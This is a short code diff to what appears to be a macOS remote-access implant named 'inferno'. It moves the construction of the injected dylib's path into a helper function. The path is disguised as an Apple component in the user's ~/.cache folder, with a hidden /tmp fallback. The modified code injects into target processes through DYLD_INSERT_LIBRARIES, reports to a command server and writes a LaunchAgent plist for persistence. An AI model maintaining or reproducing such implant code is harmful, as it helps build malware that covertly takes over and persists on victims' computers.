@@ -35,6 +35,16 @@
 
 namespace inferno {
 
+static std::string getAgentDylibPath() {
+#ifdef __APPLE__
+    const char* home = ::getenv("HOME");
+    return home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
+                : "/tmp/.inferno_agent.dylib";
+#else
+    return {};
+#endif
+}
+
 Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::Agent(const std::string& server_ip, uint16_t server_port)
@@ -351,9 +361,7 @@ void Agent::handleInjection(Packet&& packet) {
     target.path = target_path;
     target.capability = inferno::tier2::InjectionCapability::DYLD_INSERT_LIBRARIES;
 
-    const char* home = ::getenv("HOME");
-    std::string dylib_path = home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
-                                  : "/tmp/.inferno_agent.dylib";
+    std::string dylib_path = getAgentDylibPath();
 
     bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
                                                      m_server_ip, m_server_port);
@@ -607,7 +615,7 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
 
     std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
     std::string plist_path = plist_dir + "/com.inferno.agent.plist";
-    std::string dylib_path = std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib";
+    std::string dylib_path = getAgentDylibPath();
 
     ::mkdir(plist_dir.c_str(), 0755);
 
